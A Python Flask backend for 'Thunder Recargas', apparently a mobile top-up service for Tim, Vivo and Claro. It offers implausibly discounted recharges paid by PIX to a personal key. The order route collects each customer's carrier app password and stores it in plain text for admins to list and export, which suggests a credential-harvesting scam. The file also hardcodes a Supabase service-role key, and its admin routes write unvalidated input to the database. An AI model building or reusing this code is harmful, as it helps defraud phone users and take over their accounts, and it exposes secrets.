import os
import json
import time
import csv
import io
from datetime import datetime, timedelta
import pytz
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
from functools import wraps
from supabase import create_client, Client
from dotenv import load_dotenv
import threading

# Carregar variáveis de ambiente
load_dotenv()

# --- INICIALIZAÇÃO E CONFIGURAÇÃO DA APLICAÇÃO ---
app = Flask(__name__)
CORS(app)

# --- CONFIGURAÇÃO SUPABASE ---
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'https://pcbtgvdcihowmtmqzhns.supabase.co')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBjYnRndmRjaWhvd210bXF6aG5zIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2MzIyODk1OSwiZXhwIjoyMDc4ODA0OTU5fQ.2F5YFviXUv5LeQmNKvPgiVAHmeioJ_3ro9K8enZxVsM')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')

# Inicializar cliente Supabase
try:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
    supabase_connected = True
except Exception as e:
    print(f"Erro ao conectar ao Supabase: {e}")
    supabase_connected = False
    supabase = None

VALID_OPERATORS = ['tim', 'vivo', 'claro']

# Cache para reduzir consultas ao banco
config_cache = None
config_cache_time = 0
CACHE_DURATION = 30  # segundos

# Variável para controlar estado do servidor
server_awake = True

# --- FUNÇÕES AUXILIARES SUPABASE ---

def get_cached_config():
    """Busca configuração com cache"""
    global config_cache, config_cache_time
    
    current_time = time.time()
    if config_cache and (current_time - config_cache_time) < CACHE_DURATION:
        return config_cache
    
    if not supabase_connected:
        return get_default_config()
    
    try:
        response = supabase.table('config').select('*').eq('id', 1).execute()
        if response.data and len(response.data) > 0:
            config_cache = response.data[0].get('data', get_default_config())
            config_cache_time = current_time
            return config_cache
        return get_default_config()
    except Exception as e:
        print(f"Erro ao buscar configuração: {e}")
        return get_default_config()

def get_default_config():
    """Configuração padrão caso falhe o Supabase"""
    return {
        "pageTitle": "Thunder Recargas",
        "headerTitle": "Thunder Recargas",
        "headerSubtitle": "Recargas promocionais com segurança e PIX",
        "pixKey": "82999158412",
        "pixName": "Jeferson",
        "pixCity": "SAO PAULO",
        "rechargeOptions": {
            "Vivo": ["R$35,00 PAGA R$25,00", "R$40,00 PAGA R$38,00", "R$50,00 PAGA R$20,00"],
            "Claro": ["R$20,00 PAGA R$15,00", "R$25,00 PAGA R$20,00", "R$30,00 PAGA R$22,00", 
                     "R$35,00 PAGA R$25,00", "R$40,00 PAGA R$30,00", "R$50,00 PAGA R$35,00"],
            "Tim": ["R$15,00 PAGA R$10,00", "R$20,00 PAGA R$15,00", "R$30,00 PAGA R$20,00", "R$40,00 PAGA R$30,00"]
        },
        "footerWarning": "Atenção: As recargas promocionais podem levar até 24 horas para serem creditadas em sua linha após a confirmação do pagamento.",
        "footerCopyright": "© 2025 Thunder Recargas. Todos os direitos reservados."
    }

def save_config(config_data):
    """Salva configuração no Supabase"""
    global config_cache, config_cache_time
    
    if not supabase_connected:
        return False
    
    try:
        response = supabase.table('config').upsert({
            'id': 1,
            'data': config_data,
            'updated_at': datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }).execute()
        
        if response.data:
            config_cache = config_data
            config_cache_time = time.time()
            return True
        return False
    except Exception as e:
        print(f"Erro ao salvar configuração: {e}")
        return False

# --- FUNÇÃO DE AUTENTICAÇÃO DO ADMIN ---
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_password = request.headers.get('Authorization')
        if not auth_password or auth_password != ADMIN_PASSWORD:
            return jsonify({'message': 'Acesso negado.'}), 401
        return f(*args, **kwargs)
    return decorated_function

# --- ROTAS DA API ---

@app.route('/health', methods=['GET'])
def health_check():
    """Endpoint de saúde para manter o servidor acordado"""
    global server_awake
    server_awake = True
    
    # Verificar conexão com Supabase
    db_status = "connected" if supabase_connected else "disconnected"
    
    return jsonify({
        'status': 'awake',
        'timestamp': datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat(),
        'service': 'thunder-recargas',
        'database': db_status,
        'uptime': time.time() - app_start_time
    }), 200

@app.route('/wakeup', methods=['GET'])
def wakeup_server():
    """Endpoint específico para acordar o servidor rapidamente"""
    global server_awake
    server_awake = True
    
    # Fazer uma consulta leve ao Supabase para verificar conexão
    try:
        supabase.table('config').select('id').limit(1).execute()
        db_status = "connected"
    except:
        db_status = "disconnected"
    
    return jsonify({
        'status': 'awake',
        'message': 'Servidor ativado com sucesso',
        'timestamp': datetime.now().isoformat(),
        'database': db_status
    }), 200

@app.route('/', methods=['GET'])
def index():
    """Endpoint raiz para manter servidor ativo"""
    return jsonify({
        'service': 'Thunder Recargas API',
        'version': '2.0',
        'status': 'online',
        'timestamp': datetime.now().isoformat()
    }), 200

@app.route('/api/config', methods=['GET'])
def get_config():
    """Fornece os dados de configuração para a página do cliente"""
    try:
        config_data = get_cached_config()
        return jsonify(config_data), 200
    except Exception as e:
        print(f"Erro no get_config: {e}")
        return jsonify(get_default_config()), 200

@app.route('/api/admin/config', methods=['PUT'])
@admin_required
def update_config():
    """Salva as alterações feitas pelo admin no painel de configurações"""
    try:
        new_config_data = request.get_json()
        
        if save_config(new_config_data):
            return jsonify({'message': 'Configurações salvas com sucesso!'}), 200
        return jsonify({'message': 'Erro ao salvar configurações.'}), 500
        
    except Exception as e:
        print(f"Erro no update_config: {e}")
        return jsonify({'message': 'Erro ao salvar as configurações.'}), 500

@app.route('/api/recarregar', methods=['POST'])
def handle_recharge():
    """Rota para criar nova recarga"""
    data = request.get_json()
    operadora = (data.get('operadora') or '').lower()
    
    if operadora not in VALID_OPERATORS:
        return jsonify({'message': f'Operadora inválida.'}), 400
    
    try:
        if not supabase_connected:
            return jsonify({'message': 'Sistema temporariamente indisponível. Tente novamente em alguns segundos.'}), 503
        
        novo_pedido = {
            "timestamp": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat(),
            "nome": data.get('nome'),
            "telefone": data.get('telefone'),
            "operadora": data.get('operadora'),
            "recarga_selecionada": data.get('recarga_selecionada'),
            "senha_app": data.get('senha_tim') or data.get('senha_vivo') or data.get('senha_claro'),
            "status": "na-fila",
            "admin_comment": "",
            "created_at": datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        }
        
        response = supabase.table('recargas').insert(novo_pedido).execute()
        
        if response.data:
            return jsonify({'message': 'Sua solicitação foi registrada com sucesso!'}), 201
        else:
            return jsonify({'message': 'Erro ao salvar pedido.'}), 500
            
    except Exception as e:
        print(f"Erro no handle_recharge: {e}")
        return jsonify({'message': 'Erro no servidor. Por favor, tente novamente.'}), 500

# Rotas de gerenciamento de pedidos (admin)
@app.route('/api/admin/recargas', methods=['GET'])
@admin_required
def get_all_recargas():
    """Busca todas as recargas com filtros e paginação"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        # Parâmetros de filtro
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 10))
        offset = (page - 1) * limit
        
        # Construir query base
        query = supabase.table('recargas').select('*', count='exact')
        
        # Aplicar filtros
        search = request.args.get('search')
        if search:
            query = query.or_(f"nome.ilike.%{search}%,telefone.ilike.%{search}%")
        
        status = request.args.get('status')
        if status:
            query = query.eq('status', status)
        
        operadora = request.args.get('operadora')
        if operadora:
            query = query.eq('operadora', operadora)
        
        # Filtro por data
        date_start = request.args.get('dateStart')
        date_end = request.args.get('dateEnd')
        if date_start and date_end:
            query = query.gte('timestamp', date_start).lte('timestamp', date_end)
        elif request.args.get('period'):
            period = request.args.get('period')
            today = datetime.now(pytz.timezone('America/Sao_Paulo')).date()
            
            if period == 'today':
                query = query.gte('timestamp', today.isoformat())
            elif period == 'week':
                week_start = today - timedelta(days=today.weekday())
                query = query.gte('timestamp', week_start.isoformat())
            elif period == 'month':
                month_start = today.replace(day=1)
                query = query.gte('timestamp', month_start.isoformat())
        
        # Ordenação e paginação
        query = query.order('timestamp', desc=True).range(offset, offset + limit - 1)
        
        response = query.execute()
        
        total = response.count if hasattr(response, 'count') else len(response.data)
        
        return jsonify({
            'data': response.data,
            'total': total,
            'page': page,
            'limit': limit,
            'total_pages': (total + limit - 1) // limit if total else 1
        }), 200
        
    except Exception as e:
        print(f"Erro no get_all_recargas: {e}")
        return jsonify({'message': 'Falha ao buscar dados.'}), 500

@app.route('/api/admin/recargas/<recarga_id>', methods=['PUT'])
@admin_required
def update_recarga(recarga_id):
    """Atualiza uma recarga específica"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        update_data = request.get_json()
        response = supabase.table('recargas').update(update_data).eq('id', recarga_id).execute()
        
        if response.data:
            return jsonify({
                'message': 'Recarga atualizada com sucesso!',
                'recarga': response.data[0]
            }), 200
        return jsonify({'message': 'Recarga com este ID não foi encontrada.'}), 404
        
    except Exception as e:
        print(f"Erro no update_recarga: {e}")
        return jsonify({'message': 'Falha ao atualizar a recarga.'}), 500

@app.route('/api/admin/recargas/<recarga_id>', methods=['DELETE'])
@admin_required
def delete_recarga(recarga_id):
    """Exclui uma recarga"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        response = supabase.table('recargas').delete().eq('id', recarga_id).execute()
        
        if response.data:
            return jsonify({'message': 'Recarga excluída com sucesso!'}), 200
        return jsonify({'message': 'Recarga com este ID não foi encontrada.'}), 404
        
    except Exception as e:
        print(f"Erro no delete_recarga: {e}")
        return jsonify({'message': 'Falha ao excluir a recarga.'}), 500

@app.route('/api/admin/dashboard', methods=['GET'])
@admin_required
def get_dashboard_data():
    """Dados para o dashboard admin"""
    try:
        if not supabase_connected:
            return jsonify({
                'total': 0,
                'statusCounts': {'recarga-efetuada': 0, 'sendo-processada': 0, 'na-fila': 0, 'erro': 0},
                'operatorCounts': {'Tim': 0, 'Vivo': 0, 'Claro': 0},
                'variations': {'total': 0, 'completed': 0, 'pending': 0, 'error': 0}
            }), 200
        
        # Total de pedidos
        total_response = supabase.table('recargas').select('*', count='exact').execute()
        total = total_response.count if hasattr(total_response, 'count') else 0
        
        # Contagem por status
        status_response = supabase.table('recargas').select('status').execute()
        status_counts = {'recarga-efetuada': 0, 'sendo-processada': 0, 'na-fila': 0, 'erro': 0}
        
        for item in status_response.data:
            status = item.get('status')
            if status in status_counts:
                status_counts[status] += 1
        
        # Contagem por operadora
        operator_response = supabase.table('recargas').select('operadora').execute()
        operator_counts = {'Tim': 0, 'Vivo': 0, 'Claro': 0}
        
        for item in operator_response.data:
            operator = item.get('operadora')
            if operator in operator_counts:
                operator_counts[operator] += 1
        
        # Variações (simplificado)
        variations = {
            'total': 0,
            'completed': 0,
            'pending': 0,
            'error': 0
        }
        
        return jsonify({
            'total': total,
            'statusCounts': status_counts,
            'operatorCounts': operator_counts,
            'variations': variations
        }), 200
        
    except Exception as e:
        print(f"Erro no get_dashboard_data: {e}")
        return jsonify({'message': 'Falha ao buscar dados do dashboard.'}), 500

@app.route('/api/admin/export', methods=['GET'])
@admin_required
def export_data():
    """Exporta dados em diferentes formatos"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        format_type = request.args.get('format', 'csv')
        
        # Buscar todos os dados
        response = supabase.table('recargas').select('*').order('timestamp', desc=True).execute()
        
        if format_type == 'csv':
            output = io.StringIO()
            writer = csv.writer(output, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
            # Cabeçalho
            if response.data and len(response.data) > 0:
                headers = list(response.data[0].keys())
                writer.writerow(headers)
                
                # Dados
                for row in response.data:
                    writer.writerow([row.get(key, '') for key in headers])
            
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': f'attachment; filename=recargas_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'}
            )
            
        elif format_type == 'excel':
            # Para Excel, retornamos CSV (simplificado)
            output = io.StringIO()
            writer = csv.writer(output, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
            if response.data and len(response.data) > 0:
                headers = list(response.data[0].keys())
                writer.writerow(headers)
                
                for row in response.data:
                    writer.writerow([row.get(key, '') for key in headers])
            
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': f'attachment; filename=recargas_{datetime.now().strftime("%Y%m%d_%H%M%S")}.xlsx'}
            )
            
        elif format_type == 'json':
            return jsonify(response.data), 200
            
        else:
            return jsonify({'message': 'Formato não suportado.'}), 400
            
    except Exception as e:
        print(f"Erro no export_data: {e}")
        return jsonify({'message': 'Falha ao exportar dados.'}), 500

@app.route('/api/admin/recargas', methods=['POST'])
@admin_required
def create_recarga():
    """Cria uma nova recarga pelo admin"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        new_data = request.get_json()
        
        # Adicionar timestamp
        new_data['timestamp'] = datetime.now(pytz.timezone('America/Sao_Paulo')).isoformat()
        if 'status' not in new_data:
            new_data['status'] = 'na-fila'
        
        response = supabase.table('recargas').insert(new_data).execute()
        
        if response.data:
            return jsonify({
                'message': 'Novo pedido adicionado com sucesso!',
                'recarga': response.data[0]
            }), 201
        return jsonify({'message': 'Erro ao criar pedido.'}), 500
        
    except Exception as e:
        print(f"Erro no create_recarga: {e}")
        return jsonify({'message': 'Falha ao criar recarga.'}), 500

# Função para manter servidor ativo
def keep_alive():
    """Função periódica para manter servidor ativo"""
    while True:
        time.sleep(300)  # 5 minutos
        try:
            if supabase_connected:
                supabase.table('config').select('id').limit(1).execute()
        except:
            pass

# Inicializar variável de tempo
app_start_time = time.time()

if __name__ == '__main__':
    # Iniciar thread para manter servidor ativo
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)